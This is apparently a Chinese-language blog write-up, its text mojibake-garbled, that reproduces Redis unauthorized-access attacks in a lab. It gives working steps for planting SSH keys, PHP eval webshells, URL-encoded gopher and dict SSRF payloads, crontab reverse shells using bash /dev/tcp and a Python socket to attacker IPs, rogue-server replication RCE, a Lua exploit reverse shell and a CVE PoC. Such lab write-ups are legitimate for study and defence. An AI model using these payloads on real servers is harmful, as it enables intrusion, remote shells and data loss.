title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="å¤ç°å‡†å¤‡"><a href="#å¤ç°å‡†å¤‡" class="headerlink" title="å¤ç°å‡†å¤‡"></a>å¤ç°å‡†å¤‡</h3><p>å®‰è£…Redis</p><p>sudo apt-get update # æ›´æ–°apt åŒ…<br>sudo apt-get install redis-server # å®‰è£…Redis<br>service redis-server start # å¼€å¯Redis æœåŠ¡ï¼ˆ ç»è¿‡å¤ç°ï¼Œè¿™ç§æ¨¡å¼ä¸‹ï¼Œæ˜¯ä»¥redisèº«ä»½è¿è¡Œçš„redis æœåŠ¡<br>redis-cli # è¿›å…¥Redis å‘½ä»¤è¡Œæ¨¡å¼</p><p>å¤ç°ç¯å¢ƒ<br><img src="https://i.imgur.com/2VYBQlt.png"></p><p>ç½‘ç»œç¯å¢ƒï¼šNAT</p><p>æ”»å‡»æœºï¼šKali Linuxï¼š192.168.118.129</p><p>é¶æœºï¼šUbuntu 18.04 ï¼š192.168.118.142</p><p>Redis è¿æ¥å‘½ä»¤<br>redis-cli -h 127.0.0.1 -p 6379<br>è§£å†³Redis æ— æ³•è¿œç¨‹è¿æ¥ï¼š<a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a></p><p>ä¿®æ”¹redis é…ç½®æ–‡ä»¶: Ubuntu åœ¨ /etc/redis/redis.conf</p><p>#bind 127.0.0.1<br>redisåœ¨å¼€æ”¾å¾€å¤–ç½‘çš„æƒ…å†µä¸‹(é»˜è®¤é…ç½®æ˜¯bind 127.0.0.1ï¼Œåªå…è®¸æœ¬åœ°è®¿é—®ï¼Œå¦‚æœé…ç½®äº†å…¶ä»–ç½‘å¡åœ°å€é‚£ä¹ˆå°±å¯ä»¥ç½‘ç»œè®¿é—®)ï¼Œé»˜è®¤é…ç½®ä¸‹æ˜¯ç©ºå£ä»¤ï¼Œç«¯å£ä¸º6379ã€‚</p><p>Protected-mode no<br>redis3.2ç‰ˆæœ¬åæ–°å¢protected-modeé…ç½®ï¼Œé»˜è®¤æ˜¯yesï¼Œå³å¼€å¯ã€‚è®¾ç½®å¤–éƒ¨ç½‘ç»œè¿æ¥redisæœåŠ¡ï¼Œè®¾ç½®æ–¹å¼å¦‚ä¸‹ï¼š<br>1ã€å…³é—­protected-modeæ¨¡å¼ï¼Œæ­¤æ—¶å¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®<br>2ã€å¼€å¯protected-modeä¿æŠ¤æ¨¡å¼ï¼Œéœ€é…ç½®bind ipæˆ–è€…è®¾ç½®è®¿é—®å¯†ç </p><h3 id="å¼€å§‹å¤ç°"><a href="#å¼€å§‹å¤ç°" class="headerlink" title="å¼€å§‹å¤ç°"></a>å¼€å§‹å¤ç°</h3><p>å¯¹é¶æœºè¿›è¡Œå…¨ç«¯å£æ‰«æï¼š<br><img src="https://i.imgur.com/OiedL9z.png"></p><p>å‘ç°å¯¹å¤–å¼€å¯6379 redis æœåŠ¡ã€‚è·å–redis è¯¦ç»†ä¿¡æ¯</p><p>nmap -A -p 6379 -script redis-info 192.168.118.142<br><img src="https://i.imgur.com/LVfNqbh.png"></p><p>å°è¯•è¿œç¨‹è¿æ¥å—å®³è€…redis æœåŠ¡ã€‚</p><p>redis-cli -h 192.168.118.142 -p 6379</p><p>æˆåŠŸè¿ä¸Šï¼Œæ‰§è¡Œå‘½ä»¤ping , å¦‚æœå›æ˜¾PONG åˆ™è¡¨ç¤ºè¿œç¨‹ç™»å½•æˆåŠŸã€‚</p><p>æ‰§è¡Œinfo å‘½ä»¤ï¼Œåœ¨redis 2.8 ä»¥åå¯ä»¥çœ‹åˆ°redis é…ç½®æ–‡ä»¶çš„ç‰©ç†è·¯å¾„ï¼š<br><img src="https://i.imgur.com/Ks7zBDv.png"></p><p>Ubuntu ä¸‹ä¸ºï¼š/etc/redis/redis.conf</p><p>CentOs ä¸‹ä¸ºï¼š/etc/redis.conf</p><p>åœºæ™¯ä¸€ï¼šåˆ©ç”¨redis å†™å…¥ssh key è¿œç¨‹ç™»å½•é¶æœºssh<br>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥å†æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyã€‚</p><p>æ¡ä»¶ï¼š</p><p>é¶æœºä»¥root èº«ä»½å¯åŠ¨redis æœåŠ¡<br>redis è®¤è¯æ— å¯†ç æˆ–è€…å¼±å£ä»¤<br>æœåŠ¡å™¨å¼€å¯sshæœåŠ¡ï¼Œå¹¶å…è®¸ä»¥å¯†é’¥ç™»å½• ï¼Œå¼€å¯ssh æœåŠ¡ï¼š<a href="https://blog.csdn.net/jackghq/article/details/54974141">https://blog.csdn.net/jackghq/article/details/54974141</a><br>æ”»å‡»æœºï¼š</p><p>ç”Ÿæˆssh key<br>ssh-keygen -t rsa<br><img src="https://i.imgur.com/V8qwFVy.png"></p><p>è¿™é‡Œä½¿ç”¨\n\n å‰åæ¢è¡Œï¼Œæ˜¯ä¸ºäº†é¿å…å’Œredis å…¶ä»–ç¼“å­˜çš„æ•°æ®æ··æ·†ã€‚</p><p>å°†ç”Ÿæˆçš„key.txt å†™å…¥é¶æœºçš„ç¼“å†²é‡Œ<br>cat /root/.ssh/key.txt | redis-cli -h 192.168.118.142 -x set evil_ssh_key</p><p>è¿™é‡Œå‡ºç°æŠ¥é”™ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç‰ˆæœ¬é—®é¢˜è¿˜æ˜¯æ‰§è¡Œçš„å‘½ä»¤æœ‰é—®é¢˜ï¼ŒGoogle è§£å†³ï¼š</p><p><a href="https://www.jianshu.com/p/3aaf21dd34d6">https://www.jianshu.com/p/3aaf21dd34d6</a></p><p>åŸå› ï¼šå¼ºåˆ¶å…³é—­redis å¿«ç…§å¯¼è‡´ä¸èƒ½æŒä¹…åŒ–ã€‚</p><p>åœ¨é¶æœºä¸Šredis æ‰§è¡Œï¼ˆæ‰€ä»¥æˆ‘æ„Ÿè§‰è¿™æ¬¡å¤ç°ç®—æ˜¯å¤±è´¥äº†ï¼Œå®é™…ç¯å¢ƒæ€ä¹ˆå¯èƒ½å‘¢ï¼Œ</p><p>127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no<br>å½“æˆ‘æ­£å‡†å¤‡å†™çš„æ—¶å€™ï¼Œå‘ç°permission deniedã€‚åŸå› ï¼šé¶æœºredis ä¸æ˜¯ä»¥root èº«ä»½è¿è¡Œï¼Œè¯´ä¸å®šä¸Šä¸€ä¸ªæŠ¥é”™ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿™ä¸ªåŸå› ã€‚</p><p>å°†permission deiedçš„é—®é¢˜å»æœç´¢ã€‚å‘ç°å·²æœ‰äººè¸©è¿‡å‘ã€‚</p><p><a href="https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/">https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/</a></p><p><img src="https://i.imgur.com/o04V2rM.png"></p><p>æœç„¶ï¼ŒæŸ¥çœ‹è¿›ç¨‹å‘ç°ï¼Œredis ä¸æ˜¯ä»¥root èº«ä»½ç™»å½•çš„ã€‚è€Œä¸”ä¸Šé¢é‚£ä¸ªä¿®æ”¹ä¸ºnoï¼Œåªæ˜¯ä¸æŠ¥é”™ï¼Œé—®é¢˜å…¶å®ä¹Ÿå¹¶æ²¡æœ‰è§£å†³ã€‚è¿™é‡Œé€šè¿‡ä»¥rootæƒé™ä½¿ç”¨é…ç½®æ–‡ä»¶å¯åŠ¨redis-server å³å¯ã€‚ï¼ˆåŸå› æ˜¯é«˜ç‰ˆæœ¬redisï¼Œé»˜è®¤ä»¥redis èº«ä»½è¿è¡Œçš„</p><ol><li>è®¾ç½®redis å¤‡ä»½è·¯å¾„ä¸º/root/.ssh , è¿™æ ·å¯ä»¥å†™å…¥æˆ‘ä»¬çš„evil_ssh_key<br>config set dir /root/.ssh   # å¦‚æœæŠ¥é”™ï¼Œè¯´æ˜é¶æœºæ²¡æœ‰ç™»å½•è¿‡sshã€‚æ‰§è¡Œ ssh localhost å³å¯</li><li>è®¾ç½®ä¿å­˜æ–‡ä»¶åä¸º authorized_keys<br>config set dbfilename authorized_keys</li><li>ä¿å­˜ï¼Œæ•°æ®å†™å…¥dir ç›®å½•ä¸‹çš„ dbfilename ä¸­<br>save</li><li>ssh è¿æ¥å³å¯getshell<br>dir: The DB will be written inside this directory, with the filename specified above using the â€˜dbfilenameâ€™ configuration directive.<br>dbfilename: The filename where to dump the DB</li></ol><p>/etc/redis/redis.conf</p><p><img src="https://i.imgur.com/NQONHXo.png"></p><p>æ–¹æ³•äºŒï¼šç”Ÿæˆç¬¦åˆRESP æ ¼å¼çš„payload ï¼Œåˆ©ç”¨ ssrf(gopher åè®®) + curl æ‰“ã€‚<br>è¿™é‡Œä¸åšå¤ç°ã€‚</p><h4 id="åœºæ™¯äºŒï¼šåˆ©ç”¨redis-å†™å…¥webshell"><a href="#åœºæ™¯äºŒï¼šåˆ©ç”¨redis-å†™å…¥webshell" class="headerlink" title="åœºæ™¯äºŒï¼šåˆ©ç”¨redis å†™å…¥webshell"></a>åœºæ™¯äºŒï¼šåˆ©ç”¨redis å†™å…¥webshell</h4><p>ç›´æ¥å†™ webshell<br>192.168.118.142:6379&gt; config set dir /var/www/html<br>OK<br>192.168.118.142:6379&gt; set xxx â€œ\n\n\n<?php @eval($_POST[a];?>\n\n\nâ€<br>OK<br>192.168.118.142:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.142:6379&gt; save<br>OK<br>192.168.118.142:6379&gt;<br>ä½¿ç”¨èšå‰‘å‘ç°æ— æ³•è¿æ¥ã€‚ä¸è¿‡åœ¨é¶æœºä¸Šç¡®å®å¯ä»¥çœ‹åˆ°æ–‡ä»¶å†™å…¥äº†ã€‚</p><p>è§£å†³Apache ä¸è§£æ php ï¼šsudo apt-get install libapache2-mod-php7.2<br><img src="https://i.imgur.com/tCHcAkz.png"></p><p>ç›´æ¥è®¿é—®ï¼Œè¿”å›500ã€‚å¯ä»¥çœ‹åˆ°æ–‡ä»¶å†…å®¹æœ‰ç‚¹å¥‡æ€ªã€‚è¯•è¯•flushallå…¨éƒ¨åˆ æ‰ï¼Œé‡æ–°å†™webshell ã€‚æœç„¶ï¼ŒæˆåŠŸè¿æ¥webshellã€‚</p><p>FLUSHALLå‘½ä»¤å¯ä»¥æ¸…ç©ºä¸€ä¸ªRediså®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ•°æ®</p><p>192.168.118.142:6379&gt; flushall<br>OK<br>192.168.118.142:6379&gt; config get dir</p><ol><li>â€œdirâ€</li><li>â€œ/var/www/htmlâ€</li><li>168.118.142:6379&gt; config set dir /var/www/html/<br>OK</li><li>168.118.142:6379&gt; config get dbfilename</li><li>â€œdbfilenameâ€</li><li>â€œwebshell.phpâ€</li><li>168.118.142:6379&gt; config set dbfilename shell.php<br>OK</li><li>168.118.142:6379&gt; set webshell â€œ<?php eval($_POST[a]);?>â€œ<br>OK</li><li>168.118.142:6379&gt; save<br>OK</li><li>168.118.142:6379&gt; </li></ol><p><img src="https://i.imgur.com/qApD7Ir.png"></p><p>è¿™ä¸ªæˆåŠŸè¿ä¸Šå»ï¼Œæ˜¯www-dataæƒé™ã€‚æ‰€ä»¥æ²¡æœ‰ssh ç›´æ¥æ˜¯rootæƒé™ï¼ˆå› ä¸ºsshåˆ©ç”¨æ–¹å¼ï¼Œæ˜¯rootå¯åŠ¨redisï¼Œrootç™»å½•sshã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ‹¿åˆ°webshell äº†ï¼Œè‡³å°‘æ¸—é€ä¹Ÿå°±æˆåŠŸäº†ä¸€åŠäº†ã€‚</p><p>ä¸è¿‡çœŸå®æ¸—é€ä¸å¯èƒ½è®©ä½ æ‰§è¡Œflushallçš„ï¼Œæ•°æ®æœ€é‡è¦ã€‚</p><p>SSRF å†™å…¥ WebShell<br>curl + ä¸‹é¢çš„payload</p><p>gopher://192.168.118.142:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br><img src="https://i.imgur.com/UDjp6GH.png"></p><h4 id="åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis-å†™å…¥crontab-åå¼¹shell"><a href="#åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis-å†™å…¥crontab-åå¼¹shell" class="headerlink" title="åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis å†™å…¥crontab åå¼¹shell"></a>åœºæ™¯ä¸‰ï¼šåˆ©ç”¨redis å†™å…¥crontab åå¼¹shell</h4><p>çœ‹ç½‘ä¸Šå·²ç»å¤ç°çš„å¸ˆå‚…çš„æ–‡ç« ï¼Œubuntu åˆ©ç”¨å®šæ—¶ä»»åŠ¡åå¼¹shell å‡ ä¹ä¸æˆï¼Œåˆ©ç”¨python åå¼¹æœ‰æ—¶å€™å¯ä»¥æˆåŠŸã€‚CentOS å¯ä»¥æˆåŠŸã€‚<br><img src="https://i.imgur.com/P5uZdwM.png"></p><p>è¿™é‡Œå°±ç”¨yulige æ–‡ç« ä¸­çš„ç‰ˆæœ¬ï¼šCentOS 6.7</p><p>åŸç†ä¹Ÿæ˜¯åˆ©ç”¨ æœªæˆæƒé€šè¿‡ CONFIG å’Œ set ç­‰å‘½ä»¤æ¥å†™å®šæ—¶ä»»åŠ¡ï¼Œç®€å•çš„æ¢äº†ä¸€ä¸‹ç‰©ç†è·¯å¾„(æ ¹æ®OSçš„ä¸åŒï¼Œå®šæ—¶ä»»åŠ¡çš„æ–‡ä»¶ç›®å½•ä¸åŒ)ã€‚ç„¶åå½“é¶æœºæ‰§è¡Œå®šæ—¶ä»»åŠ¡æ—¶ï¼Œå³å¯åå¼¹shellã€‚</p><p>CentOS å®šæ—¶ä»»åŠ¡ï¼š/var/spool/cron/<username></p><p>Ubuntu å®šæ—¶ä»»åŠ¡ï¼š/var/spool/cron/crontabs/<username></p><p>bash åå¼¹<br>Payload:</p><p>payloadç»è¿‡url ç¼–ç åï¼Œåœ¨å­˜åœ¨SSRFçš„æ¼æ´ç‚¹å³å¯åå¼¹shellã€‚</p><p>gopher://<target_ip>:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br>nc -lvp 1234</p><p>è¿œç¨‹ç™»å½•äº†redisï¼Œæ‰§è¡Œä¸€ä¸‹å³å¯ï¼Œå’Œå†™ ssh key ä¸€æ ·ã€‚crontab æœ€å°æ‰§è¡Œå•ä½ä¸º1åˆ†é’Ÿ</p><p>flushall # è°¨æ…ä½¿ç”¨ï¼ï¼ˆæœ¬åœ°æµ‹è¯•å¯ä»¥ï¼Œå®é™…æ¸—é€å¯èƒ½æ²¡è¿™ä¸ªå‘½ä»¤ï¼Œæœ‰ä¹Ÿä¸è¦ç”¨<br>set reshell â€œ\n\n* * * * * bash -i &gt; &amp; /dev/tcp/192.168.118.129/2333 0&gt;&amp;1\n\nâ€<br>config set dirr /var/spool/cron/<br>config set dbfilename root<br>save<br>nc -lvp 2333</p><p>python åå¼¹<br>\n\n * * * * * python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.118.129â€,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);â€™\n\n</p><h4 id="åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE"><a href="#åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE" class="headerlink" title="åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE"></a>åœºæ™¯å››ï¼šä¸»ä»å¤åˆ¶RCE</h4><p>å½±å“ç‰ˆæœ¬ï¼šRedis 4.x/5.x (&lt;= 5.0.5)<br>æ¼æ´ç±»å‹ï¼šRCE<br>åˆ©ç”¨æ¡ä»¶ï¼šæœªæˆæƒæˆ–è€…å¼±å£ä»¤å¤–ç½‘è®¿é—®redis æœåŠ¡<br>æ”»å‡»æ€è·¯ï¼šæ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p><p><img src="https://i.imgur.com/cLoUGX3.png"></p><p>redis 5.0:</p><p>redis 5.0 ä¸å…è®¸åœ¨è„šæœ¬ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå³ ä¸èƒ½ä½¿ç”¨CONFIG å‘½ä»¤å»è®¾ç½®æˆ–è€…è·å–æ•°æ®åº“çš„ç‰©ç†è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥çŒœæµ‹dbfilename ã€‚ PPT ä½œè€…ç»™å‡ºäº†ä¸€ç§æ”»å‡»æ€è·¯ï¼š</p><p><img src="https://i.imgur.com/SeNIJDt.jpg"></p><p>redis é€šè¿‡slaveof è®¾ç½®ä¸»ä»çŠ¶æ€ã€‚ä¸»ä»å¤åˆ¶çš„å¼€å¯ï¼Œå®Œå…¨æ˜¯åœ¨ä»èŠ‚ç‚¹å‘èµ·çš„ï¼›ä¸éœ€è¦æˆ‘ä»¬åœ¨ä¸»èŠ‚ç‚¹åšä»»ä½•äº‹æƒ…ã€‚</p><p>åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º.soæ–‡ä»¶ã€‚</p><p>å¤ç°è¿‡ç¨‹<br>å¯åŠ¨ä¸€ä¸ªredis 5.0 çš„é•œåƒ<br><a href="https://www.runoob.com/docker/docker-install-redis.html">https://www.runoob.com/docker/docker-install-redis.html</a></p><p><img src="https://i.imgur.com/rUwcW6f.png"></p><p>å¯åŠ¨ä¸€ä¸ªRedis Rogue Server<br>åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œå°†æ¶æ„so æ–‡ä»¶ä¸‹è½½åˆ°.py æ–‡ä»¶åŒç›®å½•ä¸‹ã€‚</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>é»˜è®¤çš„ç«¯å£ä¸º 6379 é»˜è®¤vps ç«¯å£ä¸º21000<br><img src="https://i.imgur.com/lWGmVLx.png"></p><p>è¿™é‡Œæˆ‘æ‰“äº†å‡ æ¬¡éƒ½æ˜¯timeoutã€‚ç”¨kali ç¡®ä¿¡æ˜¯å¯ä»¥ç›´æ¥è¿œç¨‹è¿æ¥æˆ‘çš„vps çš„redisæœåŠ¡çš„ã€‚è¿™é‡Œæ˜¯ç¯å¢ƒé—®é¢˜ï¼ˆè…¾è®¯äº‘ï¼‰ï¼Œç½‘ä¸Šä¹Ÿæœ‰äº›å¸ˆå‚…æ²¡å¤ä¹ æˆåŠŸï¼Œåæ¥ç”¨vps å¤ç°æˆåŠŸäº†ã€‚</p><p>å…³äºä¸»ä»å¤åˆ¶RCEï¼ŒåŸç†æ›´é‡è¦ï¼Œå…¶å®æ‰“å°±æ˜¯ç”¨åˆ«äººçš„å·¥å…·â€¦â€¦</p><h4 id="åœºæ™¯äº”ï¼šLua-RCE"><a href="#åœºæ™¯äº”ï¼šLua-RCE" class="headerlink" title="åœºæ™¯äº”ï¼šLua RCE"></a>åœºæ™¯äº”ï¼šLua RCE</h4><p>CVE-2015-4335</p><p>å½±å“ç‰ˆæœ¬ï¼šRedis before 2.8.21 and 3.x before 3.0.2</p><p>æ¼æ´å±å®³ï¼šè¿œç¨‹æ”»å‡»è€…å¯æ‰§è¡Œevalå‘½ä»¤åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Luaå­—èŠ‚ç </p><p>Exploit: <a href="https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py">https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py</a></p><p>å°†147 è¡Œçš„ host æ”¹ä¸ºç›®æ ‡æœºå™¨ipã€‚</p><p>è·å–åå¼¹shellã€‚</p><p>eval â€œtonumber(â€˜/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.1/2333 0&gt;&amp;1â€™, 8)â€ 0</p><h4 id="åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º-RCE"><a href="#åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º-RCE" class="headerlink" title="åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º RCE"></a>åœºæ™¯å…­ï¼šç¼“å†²åŒºæº¢å‡º RCE</h4><p>CVE-2016-8339</p><p>å—å½±å“çš„ç‰ˆæœ¬ 3.2.x - 3.2.4</p><p>æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œï¼ˆæ•°ç»„ä¸‹æ ‡è¶Šç•Œå¯¼è‡´æº¢å‡º</p><p>æ¶‰åŠäºŒè¿›åˆ¶ï¼Œå‚è€ƒï¼š<a href="https://bestwing.me/Redis-CVE-2016-8339-analysis.html">https://bestwing.me/Redis-CVE-2016-8339-analysis.html</a></p><p>POCï¼šconfig set client-output-buffer-limit â€œmaster 1094795585 1094795585 1094795585â€</p><h2 id="ç»•è¿‡-æˆªæ–­"><a href="#ç»•è¿‡-æˆªæ–­" class="headerlink" title="ç»•è¿‡ ? æˆªæ–­"></a>ç»•è¿‡ ? æˆªæ–­</h2><p>ä»¥ä¸‹å†…å®¹å‡è½¬è½½è‡ªyuligeçš„åšå®¢</p><p>è½¬ä¹‰ç»•è¿‡<br>å†™å…¥æ¶æ„ä»£ç ï¼šï¼ˆ&lt;? ç­‰ç‰¹æ®Šç¬¦å·éœ€è¦è½¬ä¹‰ï¼Œä¸ç„¶é—®å·åé¢ä¼šå¯¼è‡´æˆªæ–­æ— æ³•å†™å…¥ï¼‰<br>dict://0:6379/set:shell:â€\x3C\x3Fphp\x20echo$_GET[x]\x3B\x3F\x3Eâ€</p><p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a><br><img src="https://i.imgur.com/je6ovIe.png"></p><h3 id="ä¸»ä»å¤åˆ¶ç»•è¿‡"><a href="#ä¸»ä»å¤åˆ¶ç»•è¿‡" class="headerlink" title="ä¸»ä»å¤åˆ¶ç»•è¿‡"></a>ä¸»ä»å¤åˆ¶ç»•è¿‡</h3><p><a href="http://yulige.top/?p=775#i-17">http://yulige.top/?p=775#i-17</a></p><p>å½“ï¼Ÿæˆªæ–­çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸»ä»å¤åˆ¶çš„æ–¹æ³•å°†keyå€¼ä»ä¸»èŠ‚ç‚¹å¤åˆ¶è¿‡æ¥ã€‚ç„¶åèŠ‚ç‚¹å†æ‰§è¡Œå¤‡ä»½æ•°æ®åº“æ“ä½œå†™å…¥webshellã€‚</p><p>ä¸»èŠ‚ç‚¹</p><p>127.0.0.1:4444&gt; set shell â€œâ€<br>OK<br>èŠ‚ç‚¹</p><p>dict://0:6379/slaveof:127.0.0.1:4444<br>dict://0:6379/config:set:dir:/var/www/html<br>dict://0:6379/config:set:dbfilename:shell.php<br>dict://0:6379/save<br>dict://0:6379/slaveof:no:one<br>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ˜¯æˆåŠŸå†™å…¥shelläº†ã€‚</p><p>å½“ç„¶äº†å¦‚æœå¯ä»¥å‡ºå¤–ç½‘ä¹Ÿå¯ä»¥ç›´æ¥ä¸»ä»å¤åˆ¶rceï¼Œè¿™ä¸€ç‚¹åœ¨å‰é¢å°±è¯´è¿‡äº†ã€‚åªè¦ç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡å»æ¨¡æ‹Ÿredisçš„è¿”å›ï¼Œå¹¶ä¸”åœ¨å…¨é‡å¤åˆ¶çš„æ—¶å€™æŠŠæ•°æ®åº“æ–‡ä»¶æ›¿æ¢æˆsoæ–‡ä»¶å³å¯ã€‚</p><p>bitop å‘½ä»¤ç»•è¿‡<br>zer0pts CTF 2020 urlapp ï¼š<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">https://hackmd.io/@theoldmoon0602/r1mltAWHL</a><br><img src="https://i.imgur.com/VW73I1v.png"></p><p>è¯¥å‘½ä»¤å¯å°†key è¿›è¡Œä½è¿ç®—ï¼Œå–ç»“æœè¿›è¡Œä¿å­˜ã€‚</p><p>bitop å‘½ä»¤çš„è¯¦ç»†æ–‡æ¡£ï¼š<a href="https://redis.io/commands/bitop">https://redis.io/commands/bitop</a></p><p>Available since 2.6.0.</p><p>Time complexity: O(N)</p><p>Perform a bitwise operation between multiple keys (containing string values) and store the result in the destination key.</p><p>The BITOP command supports four bitwise operations: AND, OR, XOR and NOT, thus the valid forms to call the command are:</p><p>BITOP AND destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP OR destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP XOR destkey srckey1 srckey2 srckey3 â€¦ srckeyN<br>BITOP NOT destkey srckey<br>image-20200627173823931<br>image-20200627173823931</p><h3 id="setbit-å‘½ä»¤ç»•è¿‡"><a href="#setbit-å‘½ä»¤ç»•è¿‡" class="headerlink" title="setbit å‘½ä»¤ç»•è¿‡"></a>setbit å‘½ä»¤ç»•è¿‡</h3><p>æ—¢ç„¶æƒ³æ˜ç™½å…³é”®æ˜¯?æˆªæ–­çš„è¯å…¶å®æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œèƒ½æ“ä½œkeyå°±å¯ä»¥ã€‚è¿™é‡Œä¸¾å‡ºä¸€ä¸ªcommand setbit.</p><p><a href="https://www.runoob.com/redis/strings-setbit.html">https://www.runoob.com/redis/strings-setbit.html</a></p><p>Redis Setbit å‘½ä»¤ç”¨äºå¯¹ key æ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ï¼Œè®¾ç½®æˆ–æ¸…é™¤æŒ‡å®šåç§»é‡ä¸Šçš„ä½(bit)ã€‚</p><p>?çš„asciiæ˜¯63ï¼Œascii62æ˜¯&gt;ï¼ŒäºŒè¿›åˆ¶åˆ†åˆ«æ˜¯0b00011111å’Œ0b00011110ã€‚æ‰€ä»¥æŒ‰ç…§å‰é¢çš„payloadç¨å¾®æ”¹ä¸€ä¸‹å°±æ˜¯.ä½¿ç”¨setbitæ”¹åŠ¨ä¸€ä½äºŒè¿›åˆ¶å³å¯æŠŠå­—ç¬¦å˜æˆ?ï¼Œä»è€Œå¯å†™å…¥webshellã€‚</p><p>127.0.0.1:6379&gt; config set dir /var/www/html<br>OK<br>127.0.0.1:6379&gt; config set dbfilename shell.php<br>OK<br>127.0.0.1:6379&gt; set webshell â€œ&lt;&gt;php @eval($_POST[1]);&gt;&gt;â€<br>OK<br>127.0.0.1:6379&gt; setbit webshell 191 1<br>(integer) 0<br>127.0.0.1:6379&gt; setbit webshell 15 1<br>(integer) 0<br>127.0.0.1:6379&gt; save<br>OK<br>Windows ä¸‹Redis GetShell</p><h2 id="æ¼æ´ä¿®å¤"><a 